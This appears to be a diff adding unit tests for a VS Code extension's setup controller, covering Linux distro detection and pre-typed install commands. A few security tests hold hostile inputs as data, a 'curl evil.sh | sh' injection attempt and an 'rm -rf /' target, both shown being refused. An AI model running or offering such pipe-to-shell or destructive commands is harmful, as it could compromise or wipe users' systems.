@@ -4,10 +4,11 @@ import {
   TIER2_TUNABLE_KEYS,
   MUTATING_METHODS,
   READ_ONLY_METHODS,
+  isHostSourcedModel,
   type SetupHost,
   type SetupControllerDeps,
 } from './SetupController';
-import { AGENT_BACKENDS, FIM_BACKENDS, getBackend } from './registry';
+import { AGENT_BACKENDS, FIM_BACKENDS, getBackend, NEXT_DEDICATED_MODEL } from './registry';
 import type { PipxLocateResult } from './pipxLocator';
 import type { HermesPaths } from './pipxInstaller';
 import type { OllamaStatus } from './ollamaClient';
@@ -111,6 +112,28 @@ const OK_HERMES_PATHS: HermesPaths = {
   python: '/home/u/.local/share/pipx/venvs/hermes-agent/bin/python',
 };
 
+// --- T5: os-release fixtures (mirror osDetect.test.ts's family table) --------
+
+const OS_FEDORA_44 = 'NAME="Fedora Linux"\nID=fedora\nVERSION_ID=44\nPRETTY_NAME="Fedora Linux 44 (Workstation Edition)"\n';
+const OS_UBUNTU_2404 = 'PRETTY_NAME="Ubuntu 24.04 LTS"\nID=ubuntu\nID_LIKE=debian\nVERSION_ID="24.04"\n';
+const OS_UBUNTU_2204 = 'PRETTY_NAME="Ubuntu 22.04.4 LTS"\nID=ubuntu\nID_LIKE=debian\nVERSION_ID="22.04"\n';
+const OS_UBUNTU_2604 = 'PRETTY_NAME="Ubuntu 26.04 LTS"\nID=ubuntu\nID_LIKE=debian\nVERSION_ID="26.04"\n';
+const OS_DEBIAN_13 = 'PRETTY_NAME="Debian GNU/Linux 13 (trixie)"\nID=debian\nVERSION_ID="13"\n';
+const OS_ARCH = 'NAME="Arch Linux"\nPRETTY_NAME="Arch Linux"\nID=arch\n';
+const OS_TUMBLEWEED = 'ID=opensuse-tumbleweed\nID_LIKE="opensuse suse"\nVERSION_ID="20260803"\nPRETTY_NAME="openSUSE Tumbleweed"\n';
+
+// §6 copy, verbatim (drift-locked here AND used by assertions below).
+const CONTAINER_NOTE_COPY =
+  "Talaria can't tell which system your terminal acts on (VS Code appears to run in a sandbox/container) — run the install commands in a terminal on your host system, then re-check.";
+const PIPX_MISSING_KNOWN_COPY = 'pipx was not found on your PATH. Open a terminal to install it, then re-check.';
+const PIPX_MISSING_UNKNOWN_COPY =
+  "pipx was not found, and this Linux distribution wasn't recognized — install pipx with your system's package manager, then re-check.";
+// T11 (§3): the §6 "probe-timeout detail (C1)" copy, verbatim — this is what
+// the REAL pipxLocator.locatePipx() composes for {reason:'probe-timeout'};
+// the fake deps below just need SOME fixed string to prove the pass-through.
+const PROBE_TIMEOUT_COPY =
+  "Your login shell didn't answer in time — a slow shell profile (nvm, conda, a network home directory) can cause this. It's usually transient: press Re-check.";
+
 function makeFakeDeps(overrides: Partial<SetupControllerDeps> = {}): { deps: SetupControllerDeps; calls: string[] } {
   const calls: string[] = [];
   const deps: SetupControllerDeps = {
@@ -143,6 +166,23 @@ function makeFakeDeps(overrides: Partial<SetupControllerDeps> = {}): { deps: Set
     // Task 13: default = "no ACP initialize has surfaced auth methods yet"
     // (mock backend / before connect) → provider card 'waiting-agent'.
     getAdvertisedAuthMethods: () => undefined,
+    // T13 (beta.5 §4.4): the vetted-ingest seams. With the REAL registry's
+    // sha256 === '' the gate refuses at (a) — these defaults exist so the
+    // spies can prove they were NEVER reached from this file's tests.
+    verifyHfDigest: async (): Promise<{ ok: true } | { ok: false; reason: string }> => {
+      calls.push('verifyHfDigest');
+      return { ok: true };
+    },
+    ingestGguf: async (): Promise<void> => {
+      calls.push('ingestGguf');
+    },
+    // T5: default = a readable Fedora host — keeps every pre-T5 behavior
+    // test (bootstrap-terminal `sudo dnf install pipx` et al.) valid while
+    // per-family tests override with their own fixture.
+    readOsRelease: async (): Promise<{ text?: string; containerMismatch?: boolean }> => {
+      calls.push('readOsRelease');
+      return { text: OS_FEDORA_44 };
+    },
     ...overrides,
   };
   return { deps, calls };
@@ -440,7 +480,8 @@ describe('happy install: fail-closed ORDER (locatePipx -> installHermes -> write
       },
     );
     const result = await controller.handle('setup.install', { backendId: 'hermes' });
-    expect(result).toEqual({ ok: false, reason: 'pipx-missing' });
+    // T5 C-17: the returned reason is a §6-grade sentence, never the bare enum.
+    expect(result).toEqual({ ok: false, reason: PIPX_MISSING_KNOWN_COPY });
     expect(host.settings.size).toBe(0);
     expect(host.reloadOffers).toBe(0);
     void depCalls; // depCalls from makeFakeDeps default isn't used here
@@ -641,6 +682,138 @@ describe('setup.openInstallTerminal: createTerminal pre-typed only', () => {
     const result = await controller.handle('setup.openInstallTerminal', { backendId: 'hermes' });
     expect(result.ok).toBe(false);
   });
+
+  it('ollama: packageKey absent — the OS engine is NEVER consulted (byte-identical regression lock)', async () => {
+    let osReads = 0;
+    const { host, controller } = makeController(
+      {},
+      {
+        readOsRelease: async () => {
+          osReads++;
+          return { text: OS_FEDORA_44 };
+        },
+      },
+    );
+    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'ollama' });
+    expect(result).toEqual({ ok: true });
+    expect(host.terminalsCreated).toEqual([
+      { name: 'Ollama install', command: 'curl -fsSL https://ollama.com/install.sh | sh' },
+    ]);
+    expect(osReads).toBe(0);
+  });
+});
+
+// --- T6: setup.openInstallTerminal(llamacpp) routes through the OS engine ---
+
+describe('T6: setup.openInstallTerminal(llamacpp) — engine-composed command, fail-open CLOSED (S-F9)', () => {
+  it('fedora: the engine value (identical to the Fedora-shaped static command)', async () => {
+    const { host, controller } = makeController(); // default OS_FEDORA_44
+    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'llamacpp' });
+    expect(result).toEqual({ ok: true });
+    expect(host.terminalsCreated).toEqual([{ name: 'llama.cpp install', command: 'sudo dnf install llama-cpp' }]);
+  });
+
+  it('arch: the pacman line is used — NEVER the dnf line', async () => {
+    const { host, controller } = makeController({}, { readOsRelease: async () => ({ text: OS_ARCH }) });
+    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'llamacpp' });
+    expect(result).toEqual({ ok: true });
+    expect(host.terminalsCreated).toEqual([
+      { name: 'llama.cpp install', command: 'sudo pacman -S --needed llama-cpp' },
+    ]);
+  });
+
+  it('opensuse tumbleweed: the zypper line is used — NEVER the dnf line', async () => {
+    const { host, controller } = makeController({}, { readOsRelease: async () => ({ text: OS_TUMBLEWEED }) });
+    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'llamacpp' });
+    expect(result).toEqual({ ok: true });
+    expect(host.terminalsCreated).toEqual([{ name: 'llama.cpp install', command: 'sudo zypper install llamacpp' }]);
+  });
+
+  it('debian (no engine entry): refused fail-closed — guidance only, modal never shown, NEVER the dnf line', async () => {
+    const { host, controller } = makeController({}, { readOsRelease: async () => ({ text: OS_DEBIAN_13 }) });
+    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'llamacpp' });
+    expect(result.ok).toBe(false);
+    if (!result.ok) expect(result.reason).not.toContain('dnf');
+    expect(host.calls.some((c) => c.startsWith('showModal:'))).toBe(false);
+    expect(host.terminalsCreated).toEqual([]);
+  });
+
+  it('unknown family (unrecognized os-release): refused fail-closed — NEVER the dnf line', async () => {
+    const { host, controller } = makeController({}, { readOsRelease: async () => ({ text: '' }) });
+    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'llamacpp' });
+    expect(result.ok).toBe(false);
+    if (!result.ok) expect(result.reason).not.toContain('dnf');
+    expect(host.terminalsCreated).toEqual([]);
+  });
+
+  it('containerMismatch: refused with the §6 container note as the reason — NEVER the dnf line', async () => {
+    const { host, controller } = makeController({}, { readOsRelease: async () => ({ containerMismatch: true }) });
+    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'llamacpp' });
+    expect(result).toEqual({ ok: false, reason: CONTAINER_NOTE_COPY });
+    expect(host.terminalsCreated).toEqual([]);
+  });
+
+  it('SECURITY sweep: across every non-fedora fixture, the outcome command/reason never contains "dnf"', async () => {
+    const nonFedoraFixtures: { name: string; read: { text?: string; containerMismatch?: boolean } }[] = [
+      { name: 'arch', read: { text: OS_ARCH } },
+      { name: 'suse', read: { text: OS_TUMBLEWEED } },
+      { name: 'debian', read: { text: OS_DEBIAN_13 } },
+      { name: 'ubuntu 24.04', read: { text: OS_UBUNTU_2404 } },
+      { name: 'unknown', read: { text: '' } },
+      { name: 'container', read: { containerMismatch: true } },
+    ];
+    for (const fixture of nonFedoraFixtures) {
+      const { host, controller } = makeController({}, { readOsRelease: async () => fixture.read });
+      const result = await controller.handle('setup.openInstallTerminal', { backendId: 'llamacpp' });
+      const producedCommand = host.terminalsCreated[0]?.command ?? '';
+      expect(producedCommand, fixture.name).not.toContain('dnf');
+      if (!result.ok) expect(result.reason, fixture.name).not.toContain('dnf');
+    }
+  });
+
+  it('modal names the exact engine command BEFORE creating the terminal (fedora)', async () => {
+    const { host, controller } = makeController();
+    await controller.handle('setup.openInstallTerminal', { backendId: 'llamacpp' });
+    const modalCall = host.calls.find((c) => c.startsWith('showModal:'));
+    expect(modalCall).toContain('sudo dnf install llama-cpp');
+    expect(host.calls.indexOf(modalCall as string)).toBeLessThan(
+      host.calls.findIndex((c) => c.startsWith('createTerminal:')),
+    );
+  });
+});
+
+// --- T6: vllm's docs-only recipe stays refused by the existing guided-terminal guard ---
+
+describe('T6: setup.openInstallTerminal(vllm) — docs-only recipe refused, no engine read, no modal', () => {
+  it("refused: 'docs-only' is not 'guided-terminal' — no modal, no terminal, OS engine never consulted", async () => {
+    let osReads = 0;
+    const { host, controller } = makeController(
+      {},
+      {
+        readOsRelease: async () => {
+          osReads++;
+          return { text: OS_FEDORA_44 };
+        },
+      },
+    );
+    const result = await controller.handle('setup.openInstallTerminal', { backendId: 'vllm' });
+    expect(result.ok).toBe(false);
+    expect(host.terminalsCreated).toEqual([]);
+    expect(host.calls.some((c) => c.startsWith('showModal:'))).toBe(false);
+    expect(osReads).toBe(0);
+  });
+});
+
+// --- T6: status() projects vllm's docs-only recipe onto the wire (R-1a) -----
+
+describe('T6: projectBackend — vllm carries docsUrl + localInstall.flavor === "docs-only" (R-1a)', () => {
+  it('status() projects a wire-visible docsUrl for the docs-only vllm entry', async () => {
+    const { controller } = makeController();
+    const data = await controller.status();
+    const vllm = data.fim.options.find((o) => o.id === 'vllm');
+    expect(vllm?.localInstall?.flavor).toBe('docs-only');
+    expect(vllm?.docsUrl).toBe('https://docs.vllm.ai/');
+  });
 });
 
 // --- setup.openBootstrapTerminal (T11 IMPORTANT host-gap 2) ------------------
@@ -705,7 +878,8 @@ describe('setup.recheck re-probes pipx (FIX 1: the pipx-missing/python-unsuitabl
 
     // Drive the install into the sticky pipx-missing state (locatePipx call #1).
     const installResult = await controller.handle('setup.install', { backendId: 'hermes' });
-    expect(installResult).toEqual({ ok: false, reason: 'pipx-missing' });
+    // T5 C-17: reason is the §6 sentence; the PHASE (sticky issue) keeps the enum.
+    expect(installResult).toEqual({ ok: false, reason: PIPX_MISSING_KNOWN_COPY });
     expect((await controller.status()).agent.phase).toBe('pipx-missing');
 
     // Without a recheck, status() alone never re-probes (this is the bug: it
@@ -759,6 +933,55 @@ describe('setup.recheck re-probes pipx (FIX 1: the pipx-missing/python-unsuitabl
 
     await controller.handle('setup.recheck', {});
     expect((await controller.status()).agent.phase).toBe('python-unsuitable');
+  });
+
+  // T11 (§3, critic C-8): a probe-timeout is honest-but-not-fatal — the
+  // AgentSetupPhase carries 'error' (there is no dedicated phase enum member
+  // for it), and the §6 copy is surfaced verbatim as the detail line.
+  it('T11: setup.install maps locatePipx {reason:"probe-timeout"} -> {phase:"error", detail: §6 copy}', async () => {
+    const { controller } = makeController(
+      {},
+      { locatePipx: async (): Promise<PipxLocateResult> => ({ ok: false, reason: 'probe-timeout', detail: PROBE_TIMEOUT_COPY }) },
+    );
+
+    const result = await controller.handle('setup.install', { backendId: 'hermes' });
+    expect(result.ok).toBe(false);
+    if (!result.ok) expect(result.reason).toBe(PROBE_TIMEOUT_COPY);
+
+    const data = await controller.status();
+    expect(data.agent.phase).toBe('error');
+    expect(data.agent.detail).toBe(PROBE_TIMEOUT_COPY);
+  });
+
+  it('T11: setup.recheck maps locatePipx {reason:"probe-timeout"} -> {phase:"error", detail: §6 copy}', async () => {
+    const { controller } = makeController(
+      {},
+      { locatePipx: async (): Promise<PipxLocateResult> => ({ ok: false, reason: 'probe-timeout', detail: PROBE_TIMEOUT_COPY }) },
+    );
+
+    const result = await controller.handle('setup.recheck', {});
+    expect(result).toEqual({ ok: true });
+
+    const data = await controller.status();
+    expect(data.agent.phase).toBe('error');
+    expect(data.agent.detail).toBe(PROBE_TIMEOUT_COPY);
+  });
+
+  it('T11: setup.install passes its AbortController.signal into locatePipx (Cancel reachability, critic C-11)', async () => {
+    let receivedSignal: AbortSignal | undefined;
+    const { controller } = makeController(
+      {},
+      {
+        locatePipx: async (signal?: AbortSignal): Promise<PipxLocateResult> => {
+          receivedSignal = signal;
+          return OK_PIPX_LOCATE;
+        },
+      },
+    );
+
+    await controller.handle('setup.install', { backendId: 'hermes' });
+    expect(receivedSignal).toBeInstanceOf(AbortSignal);
+    expect(receivedSignal?.aborted).toBe(false);
   });
 
   it('T4 M-2 carry-forward: a REJECTING locatePipx during recheck never becomes an unhandled rejection', async () => {
@@ -1053,3 +1276,547 @@ describe('onProgress: throttled >=150ms per (op, id) via a real timer', () => {
 function settingsMap(entries: Record<string, unknown>): Map<string, unknown> {
   return new Map(Object.entries(entries));
 }
+
+/** T5 helper: drive the controller into the sticky `pipx-missing` /
+ *  `python-unsuitable` phase by running an install whose locatePipx fails
+ *  with that reason (the ONLY way the phase arises — see computeAgentPhase). */
+function failingLocate(reason: 'pipx-missing' | 'python-unsuitable', detail: string) {
+  return async (): Promise<PipxLocateResult> => ({ ok: false, reason, detail });
+}
+
+// --- T5 §1.2: status() populates SetupData.os from the engine ----------------
+
+describe('T5: status() populates SetupData.os per family (engine-composed, memoized)', () => {
+  const FAMILY_TABLE: { name: string; text: string; family: string; manager: string; prettyName: string }[] = [
+    { name: 'fedora 44', text: OS_FEDORA_44, family: 'fedora', manager: 'dnf', prettyName: 'Fedora Linux 44 (Workstation Edition)' },
+    { name: 'ubuntu 24.04', text: OS_UBUNTU_2404, family: 'debian', manager: 'apt-get', prettyName: 'Ubuntu 24.04 LTS' },
+    { name: 'debian 13', text: OS_DEBIAN_13, family: 'debian', manager: 'apt-get', prettyName: 'Debian GNU/Linux 13 (trixie)' },
+    { name: 'arch', text: OS_ARCH, family: 'arch', manager: 'pacman', prettyName: 'Arch Linux' },
+    { name: 'opensuse tumbleweed', text: OS_TUMBLEWEED, family: 'suse', manager: 'zypper', prettyName: 'openSUSE Tumbleweed' },
+  ];
+
+  for (const row of FAMILY_TABLE) {
+    it(`${row.name} -> os { family: ${row.family}, manager: ${row.manager}, prettyName }`, async () => {
+      const { controller } = makeController({}, { readOsRelease: async () => ({ text: row.text }) });
+      const data = await controller.status();
+      expect(data.os).toEqual({ family: row.family, manager: row.manager, prettyName: row.prettyName });
+    });
+  }
+
+  it('unreadable os-release ({} from the binding, e.g. win32) -> family unknown, manager unknown, NO containerNote', async () => {
+    const { controller } = makeController({}, { readOsRelease: async () => ({}) });
+    const data = await controller.status();
+    expect(data.os).toEqual({ family: 'unknown', manager: 'unknown' });
+  });
+
+  it('containerMismatch -> family unknown + the §6 container note VERBATIM (S-F10 honesty)', async () => {
+    const { controller } = makeController({}, { readOsRelease: async () => ({ containerMismatch: true }) });
+    const data = await controller.status();
+    expect(data.os).toEqual({ family: 'unknown', manager: 'unknown', containerNote: CONTAINER_NOTE_COPY });
+  });
+
+  it('a REJECTING readOsRelease degrades to unknown instead of failing status()', async () => {
+    const { controller } = makeController(
+      {},
+      {
+        readOsRelease: async () => {
+          throw new Error('EACCES');
+        },
+      },
+    );
+    const data = await controller.status();
+    expect(data.os).toEqual({ family: 'unknown', manager: 'unknown' });
+  });
+
+  it('memoized: two status() calls read os-release ONCE', async () => {
+    const { depCalls, controller } = makeController();
+    await controller.status();
+    await controller.status();
+    expect(depCalls.filter((c) => c === 'readOsRelease').length).toBe(1);
+  });
+
+  it('setup.recheck re-reads: a distro change (or container escape) is picked up', async () => {
+    let reads = 0;
+    const { controller } = makeController(
+      {},
+      {
+        readOsRelease: async () => {
+          reads++;
+          return reads === 1 ? { containerMismatch: true } : { text: OS_FEDORA_44 };
+        },
+      },
+    );
+    expect((await controller.status()).os?.family).toBe('unknown');
+    await controller.handle('setup.recheck', {});
+    const data = await controller.status();
+    expect(reads).toBe(2);
+    expect(data.os).toEqual({ family: 'fedora', manager: 'dnf', prettyName: 'Fedora Linux 44 (Workstation Edition)' });
+  });
+});
+
+// --- T5 §1.2: agent.bootstrap / agent.pythonInstall per phase ----------------
+
+describe('T5: agent.bootstrap present iff phase === pipx-missing (engine-composed)', () => {
+  it('fedora: bootstrap carries the exact engine command + §6 known-distro guidance', async () => {
+    const { controller } = makeController({}, { locatePipx: failingLocate('pipx-missing', 'no pipx') });
+    await controller.handle('setup.install', { backendId: 'hermes' });
+    const data = await controller.status();
+    expect(data.agent.phase).toBe('pipx-missing');
+    expect(data.agent.bootstrap).toEqual({ command: 'sudo dnf install pipx', guidance: PIPX_MISSING_KNOWN_COPY });
+  });
+
+  it('arch: bootstrap.command is the pacman line (per-family, never hardcoded dnf)', async () => {
+    const { controller } = makeController(
+      {},
+      { locatePipx: failingLocate('pipx-missing', 'no pipx'), readOsRelease: async () => ({ text: OS_ARCH }) },
+    );
+    await controller.handle('setup.install', { backendId: 'hermes' });
+    const data = await controller.status();
+    expect(data.agent.bootstrap).toEqual({
+      command: 'sudo pacman -S --needed python-pipx',
+      guidance: PIPX_MISSING_KNOWN_COPY,
+    });
+  });
+
+  it('unknown distro: bootstrap has NO command, §6 unknown-distro guidance', async () => {
+    const { controller } = makeController(
+      {},
+      { locatePipx: failingLocate('pipx-missing', 'no pipx'), readOsRelease: async () => ({}) },
+    );
+    await controller.handle('setup.install', { backendId: 'hermes' });
+    const data = await controller.status();
+    expect(data.agent.bootstrap).toEqual({ guidance: PIPX_MISSING_UNKNOWN_COPY });
+  });
+
+  it('absent for every non-pipx-missing phase (missing here)', async () => {
+    const { controller } = makeController();
+    const data = await controller.status();
+    expect(data.agent.phase).toBe('missing');
+    expect(data.agent.bootstrap).toBeUndefined();
+    expect(data.agent.pythonInstall).toBeUndefined();
+  });
+});
+
+describe('T5: agent.pythonInstall present iff phase === python-unsuitable (engine plan)', () => {
+  it('fedora: a command plan (sudo dnf install python3.13)', async () => {
+    const { controller } = makeController({}, { locatePipx: failingLocate('python-unsuitable', 'python too old') });
+    await controller.handle('setup.install', { backendId: 'hermes' });
+    const data = await controller.status();
+    expect(data.agent.phase).toBe('python-unsuitable');
+    expect(data.agent.pythonInstall?.kind).toBe('command');
+    expect(data.agent.pythonInstall).toMatchObject({ command: 'sudo dnf install python3.13' });
+  });
+
+  it('ubuntu 22.04: the versioned universe command plan', async () => {
+    const { controller } = makeController(
+      {},
+      { locatePipx: failingLocate('python-unsuitable', 'python too old'), readOsRelease: async () => ({ text: OS_UBUNTU_2204 }) },
+    );
+    await controller.handle('setup.install', { backendId: 'hermes' });
+    const data = await controller.status();
+    expect(data.agent.pythonInstall).toMatchObject({
+      kind: 'command',
+      command: 'sudo apt-get update && sudo apt-get install python3.11 python3.11-venv',
+    });
+  });
+
+  it('ubuntu 26.04 (the rev-3 case): a GUIDANCE plan, never a command', async () => {
+    const { controller } = makeController(
+      {},
+      { locatePipx: failingLocate('python-unsuitable', 'python too old'), readOsRelease: async () => ({ text: OS_UBUNTU_2604 }) },
+    );
+    await controller.handle('setup.install', { backendId: 'hermes' });
+    const data = await controller.status();
+    expect(data.agent.pythonInstall?.kind).toBe('guidance');
+  });
+});
+
+// --- T5 §1.2: setup.openBootstrapTerminal — server-side command resolution ---
+
+describe('T5: setup.openBootstrapTerminal resolves the command server-side from the engine ONLY', () => {
+  it('fedora, no target (defaults to pipx): modal names the EXACT command + sourceNote verbatim, then pre-types it', async () => {
+    const { host, controller } = makeController();
+    const result = await controller.handle('setup.openBootstrapTerminal', {});
+    expect(result).toEqual({ ok: true });
+    const modalCall = host.calls.find((c) => c.startsWith('showModal:'));
+    expect(modalCall).toContain('sudo dnf install pipx');
+    expect(modalCall).toContain(
+      "Fedora's official repository via dnf — the distro's signed archive, the system's root of trust (packages.fedoraproject.org).",
+    );
+    expect(host.terminalsCreated).toEqual([{ name: 'Install pipx', command: 'sudo dnf install pipx' }]);
+  });
+
+  it('arch: the pacman line is pre-typed (per-family, PIPX_BOOTSTRAP_COMMAND is gone)', async () => {
+    const { host, controller } = makeController({}, { readOsRelease: async () => ({ text: OS_ARCH }) });
+    const result = await controller.handle('setup.openBootstrapTerminal', { target: 'pipx' });
+    expect(result).toEqual({ ok: true });
+    expect(host.terminalsCreated).toEqual([{ name: 'Install pipx', command: 'sudo pacman -S --needed python-pipx' }]);
+  });
+
+  it("target:'python' on fedora: pre-types the python install command, modal names command + sourceNote", async () => {
+    const { host, controller } = makeController();
+    const result = await controller.handle('setup.openBootstrapTerminal', { target: 'python' });
+    expect(result).toEqual({ ok: true });
+    const modalCall = host.calls.find((c) => c.startsWith('showModal:'));
+    expect(modalCall).toContain('sudo dnf install python3.13');
+    expect(modalCall).toContain("Fedora's official repository via dnf");
+    expect(host.terminalsCreated).toEqual([{ name: 'Install Python', command: 'sudo dnf install python3.13' }]);
+  });
+
+  it("target:'python' on ubuntu 22.04: pre-types the versioned universe command", async () => {
+    const { host, controller } = makeController({}, { readOsRelease: async () => ({ text: OS_UBUNTU_2204 }) });
+    const result = await controller.handle('setup.openBootstrapTerminal', { target: 'python' });
+    expect(result).toEqual({ ok: true });
+    expect(host.terminalsCreated).toEqual([
+      { name: 'Install Python', command: 'sudo apt-get update && sudo apt-get install python3.11 python3.11-venv' },
+    ]);
+  });
+
+  it("target:'python' on ubuntu 26.04 (GUIDANCE plan): refused {ok:false} FAIL-CLOSED — modal never shown, terminal never created", async () => {
+    const { host, controller } = makeController({}, { readOsRelease: async () => ({ text: OS_UBUNTU_2604 }) });
+    const result = await controller.handle('setup.openBootstrapTerminal', { target: 'python' });
+    expect(result.ok).toBe(false);
+    expect(host.calls.some((c) => c.startsWith('showModal:'))).toBe(false);
+    expect(host.terminalsCreated).toEqual([]);
+  });
+
+  it('unknown family: pipx target refused fail-closed — no modal, no terminal', async () => {
+    const { host, controller } = makeController({}, { readOsRelease: async () => ({}) });
+    const result = await controller.handle('setup.openBootstrapTerminal', {});
+    expect(result.ok).toBe(false);
+    if (!result.ok) expect(result.reason).toBe(PIPX_MISSING_UNKNOWN_COPY);
+    expect(host.calls.some((c) => c.startsWith('showModal:'))).toBe(false);
+    expect(host.terminalsCreated).toEqual([]);
+  });
+
+  it('containerMismatch (marker, no host os-release): refused with the §6 container note as the reason', async () => {
+    const { host, controller } = makeController({}, { readOsRelease: async () => ({ containerMismatch: true }) });
+    const result = await controller.handle('setup.openBootstrapTerminal', {});
+    expect(result).toEqual({ ok: false, reason: CONTAINER_NOTE_COPY });
+    expect(host.terminalsCreated).toEqual([]);
+  });
+
+  it('strict target validation: anything but pipx/python is refused before any engine/modal work', async () => {
+    for (const target of ['rm -rf /', 'PIPX', '', 42, {}, null] as unknown[]) {
+      const { host, controller } = makeController();
+      const result = await controller.handle('setup.openBootstrapTerminal', { target });
+      expect(result.ok, `target=${JSON.stringify(target)}`).toBe(false);
+      expect(host.calls.some((c) => c.startsWith('showModal:'))).toBe(false);
+      expect(host.terminalsCreated).toEqual([]);
+    }
+  });
+
+  it('SECURITY: webview-supplied command text is ignored — the terminal gets the ENGINE command', async () => {
+    const { host, controller } = makeController();
+    const result = await controller.handle('setup.openBootstrapTerminal', {
+      target: 'pipx',
+      command: 'curl evil.sh | sh', // never trusted, never read
+    });
+    expect(result).toEqual({ ok: true });
+    expect(host.terminalsCreated).toEqual([{ name: 'Install pipx', command: 'sudo dnf install pipx' }]);
+  });
+
+  it("trust-gate regression: untrusted refuses target:'python' with no modal/terminal/engine read", async () => {
+    const { host, depCalls, controller } = makeController({ trusted: false });
+    const result = await controller.handle('setup.openBootstrapTerminal', { target: 'python' });
+    expect(result.ok).toBe(false);
+    expect(host.calls).toEqual([]);
+    expect(depCalls).toEqual([]);
+  });
+});
+
+// --- T5 C-17: handleInstall refusal reasons are §6-grade sentences -----------
+
+describe('T5 C-17: setup.install early-return reasons are human sentences, never bare enums', () => {
+  it('pipx-missing on an unknown distro -> the §6 unknown-distro sentence', async () => {
+    const { controller } = makeController(
+      {},
+      { locatePipx: failingLocate('pipx-missing', 'no pipx'), readOsRelease: async () => ({}) },
+    );
+    const result = await controller.handle('setup.install', { backendId: 'hermes' });
+    expect(result).toEqual({ ok: false, reason: PIPX_MISSING_UNKNOWN_COPY });
+  });
+
+  it('python-unsuitable -> the locator detail (a real sentence), not the enum', async () => {
+    const detail = 'No suitable Python (>=3.11, <3.14) was found on the login-shell PATH (probed python3.13, python3.12, python3.11).';
+    const { controller } = makeController({}, { locatePipx: failingLocate('python-unsuitable', detail) });
+    const result = await controller.handle('setup.install', { backendId: 'hermes' });
+    expect(result).toEqual({ ok: false, reason: detail });
+  });
+});
+
+// --- T7 (§2.2.2): onStatusChanged — confirmed-start / failure-write / success / recheck-complete ---
+
+describe('T7: onStatusChanged fires on confirmed-start, failure-write, success, recheck-complete (§2.2.2)', () => {
+  it('never fires before the install modal resolves, and fires once right after a CONFIRM (not at latch-set)', async () => {
+    const host = new FakeSetupHost();
+    let resolveModal: (v: boolean) => void = () => {};
+    host.showModal = () =>
+      new Promise<boolean>((resolve) => {
+        resolveModal = resolve;
+      });
+    const { deps } = makeFakeDeps();
+    const controller = new SetupController(host, deps);
+    const fires: void[] = [];
+    controller.onStatusChanged(() => fires.push(undefined));
+
+    const resultPromise = controller.handle('setup.install', { backendId: 'hermes' });
+    // Let the call reach (and await) the modal — the in-flight latch is
+    // already set at this point (critic C-16: BEFORE the modal), so this
+    // proves the fire is NOT wired to latch-set.
+    await Promise.resolve();
+    await Promise.resolve();
+    expect(fires.length).toBe(0);
+
+    resolveModal(true);
+    await resultPromise;
+    expect(fires.length).toBeGreaterThanOrEqual(1);
+  });
+
+  it('never fires when the install modal is declined', async () => {
+    const { controller } = makeController({ modalResponses: [false] });
+    const fires: void[] = [];
+    controller.onStatusChanged(() => fires.push(undefined));
+
+    const result = await controller.handle('setup.install', { backendId: 'hermes' });
+
+    expect(result).toEqual({ ok: false, reason: 'declined' });
+    expect(fires.length).toBe(0);
+  });
+
+  it('fires at confirm AND at the lastAgentIssue failure-write when locatePipx reports pipx-missing', async () => {
+    const { controller } = makeController({}, { locatePipx: failingLocate('pipx-missing', 'no pipx') });
+    const fires: void[] = [];
+    controller.onStatusChanged(() => fires.push(undefined));
+
+    const result = await controller.handle('setup.install', { backendId: 'hermes' });
+
+    expect(result.ok).toBe(false);
+    expect(fires.length).toBe(2); // 1: confirm, 2: lastAgentIssue write
+  });
+
+  it('fires at confirm AND at success (awaitingReload flip) for a full successful install', async () => {
+    const { controller } = makeController();
+    const fires: void[] = [];
+    controller.onStatusChanged(() => fires.push(undefined));
+
+    const result = await controller.handle('setup.install', { backendId: 'hermes' });
+
+    expect(result).toEqual({ ok: true });
+    expect(fires.length).toBe(2); // 1: confirm, 2: success
+  });
+
+  it('fires exactly once when setup.recheck completes (clears a prior issue)', async () => {
+    let calls = 0;
+    const { controller } = makeController(
+      {},
+      {
+        locatePipx: async (): Promise<PipxLocateResult> => {
+          calls++;
+          return calls === 1 ? { ok: false, reason: 'pipx-missing', detail: 'no pipx' } : OK_PIPX_LOCATE;
+        },
+      },
+    );
+    await controller.handle('setup.install', { backendId: 'hermes' });
+
+    const fires: void[] = [];
+    controller.onStatusChanged(() => fires.push(undefined));
+    const result = await controller.handle('setup.recheck', {});
+
+    expect(result).toEqual({ ok: true });
+    expect(fires.length).toBe(1);
+  });
+
+  it('fires exactly once when setup.recheck completes with a continued failure', async () => {
+    const { controller } = makeController(
+      {},
+      { locatePipx: failingLocate('python-unsuitable', 'still unsuitable') },
+    );
+    const fires: void[] = [];
+    controller.onStatusChanged(() => fires.push(undefined));
+
+    const result = await controller.handle('setup.recheck', {});
+
+    expect(result).toEqual({ ok: true });
+    expect(fires.length).toBe(1);
+  });
+
+  it('never fires for read-only methods (status/testRemote/cancel)', async () => {
+    const { controller } = makeController();
+    const fires: void[] = [];
+    controller.onStatusChanged(() => fires.push(undefined));
+
+    await controller.status();
+    await controller.handle('setup.testRemote', { backendId: 'ollama' });
+    await controller.handle('setup.cancel', { op: 'install', id: 'hermes' });
+
+    expect(fires.length).toBe(0);
+  });
+
+  it('never fires for OTHER mutating methods (e.g. setup.setTunable) — those rely on the provider\'s unconditional post-handle push instead', async () => {
+    const { controller } = makeController();
+    const fires: void[] = [];
+    controller.onStatusChanged(() => fires.push(undefined));
+
+    const result = await controller.handle('setup.setTunable', {
+      key: 'talaria.autocomplete.debounceMs',
+      value: 500,
+    });
+
+    expect(result).toEqual({ ok: true });
+    expect(fires.length).toBe(0);
+  });
+
+  it('dispose() clears onStatusChanged listeners (no leak)', async () => {
+    const { controller } = makeController();
+    const fires: void[] = [];
+    controller.onStatusChanged(() => fires.push(undefined));
+    controller.dispose();
+
+    // A recheck after dispose would have fired pre-dispose — proves the
+    // listener set was actually cleared, not merely unreachable.
+    await controller.handle('setup.recheck', {});
+    expect(fires.length).toBe(0);
+  });
+});
+
+// --- T13 (beta.5 §4.4): allowlist pull gate — classification + refusal order --
+
+// §6 copy, verbatim (drift-locked).
+const HOST_SOURCED_REFUSAL_COPY =
+  "Talaria never instructs Ollama to fetch from an external host — the vetted Sweep model installs through Talaria's own verified download.";
+const DOWNLOAD_UNAVAILABLE_COPY =
